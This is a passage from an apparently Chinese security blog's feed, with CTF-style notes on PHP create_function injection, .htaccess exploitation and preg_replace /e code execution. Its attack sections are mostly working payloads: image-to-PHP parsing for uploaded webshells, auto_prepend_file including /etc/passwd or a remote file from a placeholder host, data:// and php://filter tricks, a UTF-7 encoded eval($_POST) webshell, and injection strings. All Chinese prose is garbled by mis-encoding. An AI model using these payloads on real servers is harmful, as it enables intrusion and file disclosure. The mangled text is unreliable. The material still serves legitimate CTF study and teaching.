class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>. <span class="string">&#x27;test&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=;&#125;phpinfo();//</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å˜æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(); <span class="comment">//&#x27;.&#x27;;&#x27;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240123195912164.png" alt="image-20240123195912164"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;create-function-å‡½æ•°&quot;&gt;&lt;a href=&quot;#create-function-å‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;create_function()å‡½æ•°&quot;&gt;&lt;/a&gt;create_function()å‡½æ•°&lt;/h1&gt;&lt;p&gt;é€‚ç”¨èŒƒå›´</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>.htaccesså¥‡æ·«æŠ€å·§</title>
    <link href="http://example.com/2024/01/22/htaccess%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2024/01/22/htaccess%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/</id>
    <published>2024-01-22T07:10:15.000Z</published>
    <updated>2024-01-22T07:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><p>.htaccessæ–‡ä»¶æ˜¯Apacheä¸­çš„ä¸€ç§ç‰¹æ®Šæ–‡ä»¶ï¼Œå…¶æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€æ¡æˆ–å¤šæ¡æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚</p><p>.htaccessä¸­æœ‰ # å•è¡Œæ³¨é‡Šç¬¦ï¼Œå¹¶ä¸”æ”¯æŒ \ æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚</p><h1 id="ä½œç”¨èŒƒå›´"><a href="#ä½œç”¨èŒƒå›´" class="headerlink" title="ä½œç”¨èŒƒå›´"></a>ä½œç”¨èŒƒå›´</h1><p>.htaccessæ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº.htaccessæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶å­ç›®å½•ã€‚</p><p>è€Œå­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚</p><h1 id="å¸¸è§æŒ‡ä»¤"><a href="#å¸¸è§æŒ‡ä»¤" class="headerlink" title="å¸¸è§æŒ‡ä»¤"></a>å¸¸è§æŒ‡ä»¤</h1><p>.htaccesså¯ä»¥å®ç°ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><h2 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h2><p>å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler handler-name|None</span><br></pre></td></tr></table></figure><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><strong>æ­¤æ—¶å½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpè§£æ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure><p><strong>å¼€å¯ApacheæœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è®¿é—®æœ¬ç«™çš„è®°å½•</strong></p><h2 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h2><p>å®ç°åœ¨æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å¤„ç†å™¨ä¹‹é—´å»ºç«‹æ˜ å°„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler handler-name extensive[extensive]</span><br></pre></td></tr></table></figure><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .xxx</span><br></pre></td></tr></table></figure><p><strong>å°†æ‰©å±•åä¸º.xxxçš„æ–‡ä»¶ä½œä¸ºCGIè„šæœ¬æ¥å¤„ç†</strong></p><h2 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h2><p>å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType media-type extensive</span><br></pre></td></tr></table></figure><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .gif</span><br></pre></td></tr></table></figure><p><strong>å°†gifä¸ºåç¼€çš„æ–‡ä»¶å½“ä½œphpè§£æ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php png jpg gif</span><br></pre></td></tr></table></figure><p><strong>å°†png jpg gifç­‰ä¸ºåç¼€çš„æ–‡ä»¶å½“ä½œphpè§£æ</strong></p><h2 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h2><p>ï¼ˆå‰æï¼šPHPä½œä¸ºApacheæ¨¡å—ï¼Œå¹¶ä¸”æœ‰å¼€å¯AllowOverride Option æˆ– AllowOverride Allæƒé™ã€‚ï¼‰</p><p>ç”¨æ¥è®¾ç½®æŒ‡å®šçš„PHPé…ç½®å€¼ï¼ˆä¸èƒ½è®¾ç½®å¸ƒå°”å€¼ï¼‰ã€‚</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_filee images.png</span><br></pre></td></tr></table></figure><p><strong>è®¿é—®ä¸€ä¸ªphpæ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æimages.pngæ–‡ä»¶</strong></p><h2 id="php-flag"><a href="#php-flag" class="headerlink" title="php_flag"></a>php_flag</h2><p>ç”¨æ¥è®¾ç½®å¸ƒå°”ç±»å‹çš„PHPé…ç½®é€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag name on off</span><br></pre></td></tr></table></figure><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><p><strong>å°†engineè®¾ç½®ä¸º0ï¼Œå³åœ¨æœ¬ç›®å½•åŠå­ç›®å½•ä¸­å…³é—­PHPè§£æï¼Œå¯ä»¥é€ æˆæºç æ³„éœ²</strong></p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h2><p>é€šè¿‡php_flagå°†engineè®¾ç½®ä¸º0ï¼Œå…³é—­å…¶ç›®å½•åŠå­ç›®å½•phpè§£æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><h2 id="å›¾ç‰‡é©¬è§£æ"><a href="#å›¾ç‰‡é©¬è§£æ" class="headerlink" title="å›¾ç‰‡é©¬è§£æ"></a>å›¾ç‰‡é©¬è§£æ</h2><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ä¹‹å‰ï¼Œä¸Šä¼ .htaccessæ”¹å˜è§£æè§„åˆ™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .gif</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•ä¸­æœ‰å¯è§£æçš„PHPæ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡php_valueæ¥è®¾ç½®auto_prepend_fileæˆ–è€…auto_append_fileé…ç½®é€‰é¡¹æ¥è®©æ‰€æœ‰çš„<strong>PHPæ–‡ä»¶è‡ªåŠ¨åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶æˆ–æ¶æ„æ–‡ä»¶</strong>ï¼Œè§¦å‘æ–‡ä»¶åŒ…å«ã€‚</p><ul><li>auto_prepend_file</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file /etc/passwd</span><br></pre></td></tr></table></figure><ul><li>auto_append_file</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>åœ¨è®¿é—®ä¸€ä¸ªPHPæ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥phpæ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æ&#x2F;etc&#x2F;passwd</strong></p><p>åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®©å…¶åŒ…å«ä¸€ä¸ªå›¾ç‰‡é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file images.png</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>å‰ææ˜¯php.iniä¸­è®¾ç½®allow_url_includeä¸ºOn</p><p>.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file http://xxx/a.txt</span><br></pre></td></tr></table></figure><p>è¿œç¨‹ä¸»æœºa.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();&gt;</span><br></pre></td></tr></table></figure><h2 id="ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»»æ„ä»£ç æ‰§è¡Œ"></a>ä»»æ„ä»£ç æ‰§è¡Œ</h2><h3 id="é€šè¿‡phpä¼ªåè®®"><a href="#é€šè¿‡phpä¼ªåè®®" class="headerlink" title="é€šè¿‡phpä¼ªåè®®"></a>é€šè¿‡phpä¼ªåè®®</h3><p>å‰æï¼šallow_url_fopenä¸ºOnï¼Œallow_url_includeä¸ºOnï¼Œå½“å‰ç¯å¢ƒå­˜åœ¨phpæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data://text/plian,%3c%3fphp+phpinfo()%3b%3f%3e</span><br></pre></td></tr></table></figure><p><strong>ä¸ä½¿ç”¨base64åŠ å¯†åˆ™æ³¨æ„URLç¼–ç </strong></p><h3 id="é€šè¿‡è§£æ-htaccessæ–‡ä»¶"><a href="#é€šè¿‡è§£æ-htaccessæ–‡ä»¶" class="headerlink" title="é€šè¿‡è§£æ.htaccessæ–‡ä»¶"></a>é€šè¿‡è§£æ.htaccessæ–‡ä»¶</h3><ul><li>åŒ…å«.htaccessæœ¬èº«</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess#&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><ul><li>ç›´æ¥å°†.htaccessæ–‡ä»¶å½“ä½œphpæ–‡ä»¶å¤„ç†(é€‚åˆå½“å‰ç›®å½•æˆ–å­ç›®å½•æ— phpæ–‡ä»¶)</li></ul><p>å…ˆè®¾ç½®å…è®¸è®¿é—®.htaccessæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt; Require all granted Order allow.deny Allow from all&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†.htaccessæŒ‡å®šä¸ºphpæ–‡ä»¶è§£æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php# &lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;    Require all granted    Order allow,deny    Allow from all&lt;/Files&gt;SetHandler application/x-httpd-php# &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡&lt;?ç‰¹æ®Šå­—ç¬¦"></a>ç»•è¿‡&lt;?ç‰¹æ®Šå­—ç¬¦</h2><p>ç›®æ ‡ç¯å¢ƒé™åˆ¶æˆ‘ä»¬ä¸Šä¼ æˆ–å†™å…¥çš„æ–‡ä»¶ä¸èƒ½å­˜åœ¨**&lt;?**ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰é™åˆ¶.htaccess</p><h3 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=images.png&quot;</span><br></pre></td></tr></table></figure><p><strong>images.png ä¸­æ˜¯ç»è¿‡base64ç¼–ç åçš„Webshell</strong></p><p>ç›´æ¥ä½¿ç”¨<strong>data:&#x2F;&#x2F;åè®®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><h3 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h3><p>åœ¨å›¾ç‰‡ä¸­å†™å…¥UTF-7ç¼–ç çš„shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// images.png+ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®è¿›è¡Œè½¬æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;/a&gt;åŸºæœ¬æ¦‚å¿µ&lt;/h1&gt;&lt;p&gt;.htaccessæ–‡ä»¶æ˜¯Apacheä¸­çš„ä¸€ç§ç‰¹æ®Šæ–‡ä»¶ï¼Œå…¶æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>preg_replace /eæ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ</title>
    <link href="http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2024-01-19T14:56:33.000Z</published>
    <updated>2024-01-19T14:59:01.770Z</updated>
    
    <content type="html"><![CDATA[<p>æ¡ˆä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$strï¼‰</span><br></pre></td></tr></table></figure><h1 id="eæ¨¡å¼"><a href="#eæ¨¡å¼" class="headerlink" title="&#x2F;eæ¨¡å¼"></a>&#x2F;eæ¨¡å¼</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($pattern,$replacement.$string)</span><br></pre></td></tr></table></figure><p>&#x2F;e ä¿®æ­£ç¬¦ä½¿preg_replace()å°†<strong>replacement</strong>å‚æ•°å½“ä½œPHPä»£ç æ‰§è¡Œ(ç¡®ä¿replacementæ„æˆåˆæ³•PHPä»£ç å­—ç¬¦ä¸²)ã€‚</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹preg_replace()çš„ä¸€äº›æ¨¡å¼ï¼š</p><ul><li>&#x2F;g è¡¨ç¤ºè¯¥è¡¨è¾¾å¼ç”¨æ¥åœ¨<strong>è¾“å…¥å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ‰€æœ‰å¯èƒ½çš„åŒ¹é…</strong>ï¼Œè¿”å›çš„ç»“æœå¯ä»¥æ˜¯<strong>å¤šä¸ª</strong>ã€‚</li><li>&#x2F;i è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™<strong>ä¸åŒºåˆ†å¤§å°å†™</strong></li><li>&#x2F;m è¡¨ç¤º<strong>å¤šè¡ŒåŒ¹é…</strong>ï¼ˆåŒ¹é…æ¢è¡Œç¬¦ä¸¤ç«¯çš„æ½œåœ¨åŒ¹é…ï¼‰</li><li>&#x2F;s <strong>å•è¡Œæ¨¡å¼åŒ¹é…</strong></li><li>&#x2F;e <strong>å¯æ‰§è¡Œæ¨¡å¼</strong></li><li>&#x2F;x å¿½<strong>ç•¥ç©ºç™½æ¨¡å¼</strong></li></ul><h1 id="åå‘å¼•ç”¨"><a href="#åå‘å¼•ç”¨" class="headerlink" title="åå‘å¼•ç”¨"></a>åå‘å¼•ç”¨</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ &#x27;\n&#x27; è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</span><br><span class="line"></span><br><span class="line">é€šä¿—æ¥è®²ï¼Œå°±æ˜¯\åé¢è·Ÿå‡ ï¼Œå°±åŒ¹é…ç¬¬å‡ ä¸ªã€‚</span><br><span class="line">è¿™é‡Œçš„\1å°±æ˜¯æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ã€‚</span><br></pre></td></tr></table></figure><h1 id="exam"><a href="#exam" class="headerlink" title="exam"></a>exam</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¤h&#x3D;phpinfo()ï¼Œé‚£ä¹ˆä»£ç å°±ä¼šè¢«æ‰§è¡Œ</p><p>å¦‚æœæ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/s*[php](.+?)[/php]s*/ies&quot;</span>, <span class="string">&#x27;test(&quot;\1&quot;)&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>h&#x3D;[php]phpinfo()[&#x2F;php]å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºç»è¿‡æ­£åˆ™åŒ¹é…åï¼Œtest(â€œ\1â€)å°±å˜ä¸ºtest(â€œphpinfoâ€)ï¼Œæ­¤æ—¶phpè¢«å½“ä½œå­—ç¬¦ä¸²</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬æäº¤**h&#x3D;[php]{${phpinfo()}}[&#x2F;php]**ï¼Œå°±èƒ½æ‰§è¡Œphpinfoï¼Œå› ä¸ºåœ¨phpä¸­ï¼ŒåŒå¼•å·ä¸­åŒ…å«å˜é‡ï¼Œphpè§£é‡Šå™¨ä¼šå°†å…¶æ›¿æ¢ä¸ºå˜é‡è§£é‡Šåçš„ç»“æœï¼Œè€Œå•å¼•å·ä¸ä¼šã€‚</p><p>æ‰€ä»¥å¦‚æœ**â€test(â€˜\1â€™)â€**å°±ä¸ä¼šæ‰§è¡Œphpinfo</p><h1 id="ä¾‹é¢˜-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#ä¾‹é¢˜-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="ä¾‹é¢˜[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>ä¾‹é¢˜[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span 